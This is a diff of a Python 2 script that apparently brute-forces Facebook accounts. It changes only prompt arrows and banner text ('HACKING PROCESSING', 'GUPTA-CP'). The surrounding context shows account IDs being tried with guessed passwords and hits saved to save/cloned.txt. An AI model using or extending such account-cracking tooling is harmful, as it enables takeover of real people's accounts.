@@ -144,7 +144,7 @@ def login():
     pilih_login()
 
 def pilih_login():
-    peak = raw_input("\n\033[1;95m➤ \033[1;93m")
+    peak = raw_input("\n\033[1;95m---➤ \033[1;93m")
     if peak =="":
         print "\x1b[1;97mFill In Correctly"
         pilih_login()
@@ -161,7 +161,7 @@ def Zeek():
     action()
 
 def action():
-    peak = raw_input('\n\033[1;97mGUPTA➤\033[1;97m')
+    peak = raw_input('\n\033[1;97mGUPTA---➤\033[1;97m')
     if peak =='':
         print '[!] Fill In Correctly'
         action()
@@ -188,10 +188,10 @@ def action():
         action()
     print 50* '\033[1;94m-'
     xxx = str(len(id))
-    jalan ('\033[1;91m Total ids number: '+xxx)
-    jalan ('\033[1;92mCode you choose: '+c)
-    jalan ("\033[1;93mWait A While \x1b[1;94mStart Cracking...")
-    jalan ("\033[1;94mTo Stop Process Press Ctrl+z")
+    jalan ('\033[1;91m TOTAL IDS NUMBER: '+xxx)
+    jalan ('\033[1;92mCODE YOU CHOOSED: '+c)
+    jalan ("\033[1;93mWait A While \x1b[1;94mHACKING PROCESSING PLEASE WAIT HACKED ACCOUNTS WILL APPEAR HERE...")
+    jalan ("\033[1;94mTO STOP PROCESS PRESS Ctrl+z")
     print 50* '\033[1;97m-'
     def main(arg):
         global cpb,oks
@@ -246,7 +246,7 @@ def action():
                                 oks.append(c+user+pass3)
                             else:
                                 if 'www.facebook.com' in q['error_msg']:
-                                    print '\033[1;97m(\x1b[1;93mcp) ' + k + c + user + '  |  ' + pass3 
+                                    print '\033[1;97m(\x1b[1;93mGUPTA-CP) ' + k + c + user + '  |  ' + pass3 
                                     cps = open('save/cloned.txt', 'a')
                                     cps.write(k+c+user+pass3+'\n')
                                     cps.close()
